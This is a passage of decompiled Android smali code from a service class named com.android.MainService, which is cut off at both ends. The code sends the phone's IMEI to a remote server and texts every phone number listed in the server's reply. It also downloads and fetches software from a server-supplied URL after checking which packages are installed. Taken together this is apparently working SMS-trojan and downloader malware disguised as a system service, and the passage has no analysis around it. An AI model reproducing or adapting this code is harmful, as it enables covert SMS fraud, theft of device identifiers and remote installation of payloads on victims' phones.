    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 513
    new-instance v17, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 514
    const-string v18, "/?sim="

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imei:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 513
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lcom/android/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 515
    .local v15, telStr:Ljava/lang/String;
    if-eqz v15, :cond_3

    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v17

    if-eqz v17, :cond_4

    .line 533
    :cond_3
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 534
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 535
    .restart local v8       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v17, v0

    move-object v0, v8

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 536
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 517
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_4
    :try_start_2
    const-string v17, "<tel>"

    const-string v18, "</tel>"

    move-object v0, v15

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 518
    .local v14, tel:Ljava/lang/String;
    if-eqz v14, :cond_5

    invoke-virtual {v14}, Ljava/lang/String;->length()I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result v17

    const/16 v18, 0xb

    move/from16 v0, v17

    move/from16 v1, v18

    if-ge v0, v1, :cond_6

    .line 533
    :cond_5
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 534
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 535
    .restart local v8       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v17, v0

    move-object v0, v8

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 536
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 520
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_6
    :try_start_3
    const-string v17, "#"

    move-object v0, v14

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v16

    .line 521
    .local v16, tels:[Ljava/lang/String;
    move-object/from16 v0, v16

    array-length v0, v0

    move v7, v0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 522
    .local v7, len:I
    const/4 v5, 0x0

    .local v5, i:I
    :goto_1
    if-lt v5, v7, :cond_7

    .line 533
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 534
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 535
    .restart local v8       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v17, v0

    move-object v0, v8

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 536
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 523
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_7
    :try_start_4
    aget-object v10, v16, v5

    .line 524
    .local v10, smsaddress:Ljava/lang/String;
    if-eqz v10, :cond_8

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v17

    const/16 v18, 0x8

    move/from16 v0, v17

    move/from16 v1, v18

    if-ge v0, v1, :cond_9

    .line 522
    :cond_8
    :goto_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 526
    :cond_9
    move-object/from16 v0, p0

    move-object v1, v10

    move-object v2, v11

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 527
    add-int/lit8 v9, v9, 0x1

    goto :goto_2

    .line 529
    .end local v5           #i:I
    .end local v7           #len:I
    .end local v10           #smsaddress:Ljava/lang/String;
    .end local v14           #tel:Ljava/lang/String;
    .end local v15           #telStr:Ljava/lang/String;
    .end local v16           #tels:[Ljava/lang/String;
    :catch_0
    move-exception v17

    move-object/from16 v3, v17

    .line 530
    .local v3, e:Ljava/lang/Exception;
    const/16 v4, -0x385

    .line 533
    const/16 v17, 0x0

    aget-object v17, p2, v17

    const/16 v18, 0xc

    invoke-static/range {v17 .. v18}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v17

    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 534
    new-instance v17, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x1

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const-string v18, "|"

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    const/16 v18, 0x2

    aget-object v18, p2, v18

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 535
    .restart local v8       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v17, v0

    move-object v0, v8

    move-object/from16 v1, v17

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 536
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 531
    .end local v3           #e:Ljava/lang/Exception;
    .end local v8           #logtxt:Ljava/lang/String;
    :catchall_0
    move-exception v17

    .line 533
    const/16 v18, 0x0

    aget-object v18, p2, v18

    const/16 v19, 0xc

    invoke-static/range {v18 .. v19}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v18

    move-object/from16 v0, v18

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 534
    new-instance v18, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v19, v0

    invoke-static/range {v19 .. v19}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v19, "|"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const/16 v19, 0x1

    aget-object v19, p2, v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, "|"

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    const/16 v19, 0x2

    aget-object v19, p2, v19

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 535
    .restart local v8       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v18, v0

    move-object v0, v8

    move-object/from16 v1, v18

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 536
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 537
    throw v17
.end method

.method private execSoft(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 18
    .parameter "allStr"
    .parameter "record"

    .prologue
    .line 436
    const-string v14, ""

    .line 437
    .local v14, softUrl:Ljava/lang/String;
    const-string v8, "no"

    .line 438
    .local v8, isreset:Ljava/lang/String;
    const/16 v5, -0x309

    .line 441
    .local v5, flag:I
    :try_start_0
    const-string v15, "<url>"

    const-string v16, "</url>"

    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    .line 442
    const-string v15, ""

    invoke-virtual {v15, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v15

    if-eqz v15, :cond_0

    .line 476
    const/4 v15, 0x0

    aget-object v15, p2, v15

    const/16 v16, 0xc

    invoke-static/range {v15 .. v16}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 477
    new-instance v15, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x1

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x2

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 478
    .local v9, logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v15, v0

    invoke-static {v9, v15}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 479
    const/4 v15, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move v2, v15

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 481
    :goto_0
    return-void

    .line 446
    .end local v9           #logtxt:Ljava/lang/String;
    :cond_0
    :try_start_1
    const-string v15, "<isreset>"

    const-string v16, "</isreset>"

    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 447
    const/4 v7, 0x1

    .line 448
    .local v7, isexec:Z
    const-string v15, "no"

    invoke-virtual {v15, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v15

    if-eqz v15, :cond_1

    .line 449
    const-string v15, "<pack>"

    .line 450
    const-string v16, "</pack>"

    .line 449
    move-object/from16 v0, p1

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 451
    .local v11, pack:Ljava/lang/String;
    const-string v15, ""

    invoke-virtual {v15, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v15

    if-nez v15, :cond_1

    .line 452
    invoke-virtual/range {p0 .. p0}, Lcom/android/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v15

    .line 453
    const/16 v16, 0x0

    invoke-virtual/range {v15 .. v16}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v12

    .line 454
    .local v12, packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    if-eqz v12, :cond_1

    .line 455
    invoke-interface {v12}, Ljava/util/List;->size()I

    move-result v3

    .line 456
    .local v3, count:I
    const/4 v6, 0x0

    .local v6, i:I
    :goto_1
    if-lt v6, v3, :cond_3

    .line 466
    .end local v3           #count:I
    .end local v6           #i:I
    .end local v11           #pack:Ljava/lang/String;
    .end local v12           #packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_1
    if-eqz v7, :cond_2

    .line 468
    new-instance v4, Lcom/android/FileUtil;

    invoke-direct {v4}, Lcom/android/FileUtil;-><init>()V

    .line 469
    .local v4, fileUtil:Lcom/android/FileUtil;
    invoke-virtual {v4, v14}, Lcom/android/FileUtil;->getFile(Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v13

    .line 470
    .local v13, results:I
    if-nez v13, :cond_2

    .line 471
    const/16 v5, -0x378

    .line 476
    .end local v4           #fileUtil:Lcom/android/FileUtil;
    .end local v13           #results:I
    :cond_2
    const/4 v15, 0x0

    aget-object v15, p2, v15

    const/16 v16, 0xc

    invoke-static/range {v15 .. v16}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 477
    new-instance v15, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x1

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x2

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 478
    .restart local v9       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v15, v0

    invoke-static {v9, v15}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 479
    const/4 v15, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move v2, v15

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 457
    .end local v9           #logtxt:Ljava/lang/String;
    .restart local v3       #count:I
    .restart local v6       #i:I
    .restart local v11       #pack:Ljava/lang/String;
    .restart local v12       #packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :cond_3
    :try_start_2
    invoke-interface {v12, v6}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/content/pm/PackageInfo;

    .line 458
    .local v10, p:Landroid/content/pm/PackageInfo;
    iget-object v15, v10, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v11, v15}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result v15

    if-eqz v15, :cond_4

    .line 459
    const/16 v5, -0x29a

    .line 460
    const/4 v7, 0x0

    .line 456
    :cond_4
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    .line 474
    .end local v3           #count:I
    .end local v6           #i:I
    .end local v7           #isexec:Z
    .end local v10           #p:Landroid/content/pm/PackageInfo;
    .end local v11           #pack:Ljava/lang/String;
    .end local v12           #packs:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    :catch_0
    move-exception v15

    .line 476
    const/4 v15, 0x0

    aget-object v15, p2, v15

    const/16 v16, 0xc

    invoke-static/range {v15 .. v16}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v15

    move-object v0, v15

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 477
    new-instance v15, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v16

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x1

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "|"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const/16 v16, 0x2

    aget-object v16, p2, v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 478
    .restart local v9       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v15, v0

    invoke-static {v9, v15}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 479
    const/4 v15, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move v2, v15

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    goto/16 :goto_0

    .line 475
    .end local v9           #logtxt:Ljava/lang/String;
    :catchall_0
    move-exception v15

    .line 476
    const/16 v16, 0x0

    aget-object v16, p2, v16

    const/16 v17, 0xc

    invoke-static/range {v16 .. v17}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v16

    move-object/from16 v0, v16

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 477
    new-instance v16, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v17, v0

    invoke-static/range {v17 .. v17}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v17

    invoke-direct/range {v16 .. v17}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v17, "|"

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const/16 v17, 0x1

    aget-object v17, p2, v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const-string v17, "|"

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    const/16 v17, 0x2

    aget-object v17, p2, v17

    invoke-virtual/range {v16 .. v17}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 478
    .restart local v9       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object/from16 v16, v0

    move-object v0, v9

    move-object/from16 v1, v16

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 479
    const/16 v16, 0x1

    move-object/from16 v0, p0

    move v1, v5

    move/from16 v2, v16

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 480
    throw v15
.end method

.method private execTanc(Ljava/lang/String;)V
    .locals 4
    .parameter "allStr"

    .prologue
    .line 542
    const-string v1, ""

    .line 543
    .local v1, softUrl:Ljava/lang/String;
    const-string v0, "no"

    .line 546
    .local v0, isreset:Ljava/lang/String;
    :try_start_0
    const-string v2, "<url>"

    const-string v3, "</url>"

    invoke-static {p1, v2, v3}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 547
    const-string v2, ""

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 557
    :goto_0
    return-void

    .line 551
    :cond_0
